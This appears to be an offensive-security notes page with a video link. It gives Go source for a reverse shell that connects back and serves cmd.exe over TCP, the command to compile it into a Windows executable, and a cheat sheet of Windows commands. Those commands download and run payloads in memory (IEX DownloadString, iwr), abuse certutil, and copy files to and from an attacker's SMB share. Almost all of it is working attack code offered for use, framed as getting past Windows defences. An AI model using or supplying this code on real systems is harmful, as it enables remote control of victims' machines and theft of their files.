---
# the default layout is 'page'
icon: fas fa-subway
order: 6
---
#  🖥️ Windows 10 Bypass With GO 
Video Explaination [here](https://youtu.be/zM8EVJdErsc?si=uGHzpHG8HMlHIfjZ)
### nano pleasesubscribe.go
```bash
package main
import ("os/exec"; "net"; "time")

func main() { 
        time.Sleep(2 * time.Second)
        c,_:= net.Dial("tcp", "192.168.x.x:443")
        cmd:= exec.Command("cmd")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run() 
}
```
### Compile it !
```bash
GOOS=windows GOARCH=amd64 go build -o pleasesubscribe.exe pleasesubscribe.go
```
#  🗃️ File Transfer
### Windows
```bash
# 1. IEX DownloadString (Execute in memory)
IEX(New-Object Net.WebClient).DownloadString("http://$ip:$port/file")

# 2. curl (Windows 10+)
curl http://$ip:$port/file -o file

# 3. Invoke-WebRequest
powershell "iwr -Uri http://$ip:$port/file -OutFile C:\Windows\Temp\file"

# 4. NetExec (needs valid credentials)
nxc smb $ip -u '' -p '' --put-file file C:\Windows\Temp\file

# 5. PowerShell DownloadFile
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/file','C:\Temp\file')"

# 6. Short version (iwr + IEX)
IEX(iwr 'http://$ip:$port/file' -UseBasicParsing)

# 7. Certutil
certutil -urlcache -split -f http://$ip:$port/file file
certutil -urlcache * delete

# 8. wget (PowerShell alias)
wget "http://$ip:$port/file" -OutFile "C:\Windows\Temp\file"

# 9. smbserver
impacket-smbserver share ./ -smb2support -user 0xmr -pass ''

##  Copy to windows
net use \\$Attacker_IP\share /user:0xmr
copy \\$Attacker_IP\share\file C:\Temp\file

##  copy from windows
net use \\$Attacker_IP\share /user:0xmr
copy file_name \\$Attacker_IP\share

# 10. Download and Execution Both
powershell "iwr -Uri http://${YOUR_KALI_IP_ADDRESS}:$port/file -OutFile C:/Windows/Tasks/file; C:/Windows/Tasks/file"
powershell -NoProfile -Command "$ip='$Attacker_IP'; iwr http://$ip:$port/file -OutFile $env:TEMP\file; Get-Content $env:TEMP\file"
```
